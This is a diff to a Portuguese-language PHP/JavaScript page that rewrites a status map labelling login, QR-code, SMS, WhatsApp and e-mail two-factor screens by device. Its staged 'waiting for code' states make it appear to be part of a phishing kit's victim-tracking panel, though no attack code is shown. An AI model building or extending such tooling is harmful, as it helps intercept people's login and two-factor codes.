@@ -167,27 +167,27 @@ if (isset($_COOKIE['identificador_cliente'])) {
         (function() {
             // Mapa de nomes de arquivos para mensagens de status amigáveis.
             const statusMap = {
-                'index.php': 'Na Home (Desktop)',
-                'login-mobile.php': 'Na Home (Mobile)',
-                'senha.php': 'Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
-                'senha-mobile.php': 'Tela de opções  (Mobile)',
-                'dois_fatores.php': 'Tela 2FA - Mensagem (Desktop)',
-                'dois_fatores2.php': 'Tela 2FA (Desktop)',
-                'doisfatores2mobile.php': 'Tela 2FA (Mobile)',
-                'sms_desktop.php': 'Aguardando SMS (Desktop)',
-                'sms_mobile.php': 'Aguardando SMS (Mobile)',
-                'sms_whats_desktop.php': 'Aguardando SMS via WhatsApp (Desktop)',
-                'sms_whats_mobile.php': 'Aguardando SMS via WhatsApp (Mobile)',
-                'qrcode-mobile.php': 'Aguardando QR Code (Mobile)',
-                'telaqr.php': 'Aguardando QR Code (Desktop)',
-                'email2fadesktop.php': 'Aguardando E-mail 2FA (Desktop)',
-                'email2famobile.php': 'Aguardando E-mail 2FA (Mobile)',
-                'emailsms_desktop.php': 'Aguardando SMS de E-mail (Desktop)',
-                'emailsms_mobile.php': 'Aguardando SMS de E-mail (Mobile)',
-                'sms2fadesktop.php': 'Aguardando SMS 2FA (Desktop)',
-                'sms2famobile.php': 'Aguardando SMS 2FA (Mobile)',
-                'whats2fadesktop.php': 'Aguardando WhatsApp 2FA (Desktop)',
-                'whats2framobile.php': 'Aguardando WhatsApp 2FA (Mobile)'
+                'index.php': 'Usuário na tela Home (Desktop)',
+                'login-mobile.php': 'Usuário na tela Home (Mobile)',
+                'senha.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
+                'senha-mobile.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL)  (Mobile)',
+                'dois_fatores.php': 'Usuário na Tela 2FA(autenticação de duas etapas) - Mensagem (Desktop)',
+                'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
+                'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Mobile)',
+                'sms_desktop.php': 'Usuário na tela para logar com SMS (Desktop)',
+                'sms_mobile.php': 'Usuário na tela para logar com SMS (Mobile)',
+                'sms_whats_desktop.php': 'Usuário na tela para logar com SMS via WhatsApp (Desktop)',
+                'sms_whats_mobile.php': 'Usuário na tela para logar com SMS via WhatsApp (Mobile)',
+                'qrcode-mobile.php': 'Usuário na tela para logar com QR Code (Mobile)',
+                'telaqr.php': 'Usuário na tela para logar com QR Code (Desktop)',
+                'email2fadesktop.php': 'Usuário na tela para verificar duas etapas com E-mail(Desktop)',
+                'email2famobile.php': 'Usuário na tela para verificar duas etapas com E-mail(Mobile)',
+                'emailsms_desktop.php': 'Usuário na tela para logar com  E-mail (Desktop)',
+                'emailsms_mobile.php': 'Usuário na tela para logar com  E-mail (Mobile)',
+                'sms2fadesktop.php': 'Usuário na tela para verificar duas etapas com SMS (Desktop)',
+                'sms2famobile.php': 'Usuário na tela para verificar duas etapas com SMS (Mobile)',
+                'whats2fadesktop.php': 'Usuário na tela para verificar duas etapas com WhatsApp (Desktop)',
+                'whats2framobile.php': 'Usuário na tela para verificar duas etapas com WhatsApp (Mobile)'
             };
 
             // Descobre o nome do arquivo da página atual
